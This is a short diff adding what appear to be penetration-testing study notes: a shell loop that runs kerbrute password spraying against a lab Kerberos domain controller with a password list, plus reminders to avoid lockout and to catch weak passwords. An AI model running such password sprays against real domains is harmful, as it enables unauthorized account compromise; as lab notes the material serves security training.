@@ -1,0 +1,5 @@
+for p in $(cat Passwords.txt); do ./kerbrute passwordspray -d LPT.COM --dc 172.25.170.190 kerbuser $p; done
+
+Avoid lockout
+Catch weak password like cpent123
+---------------------------------------------
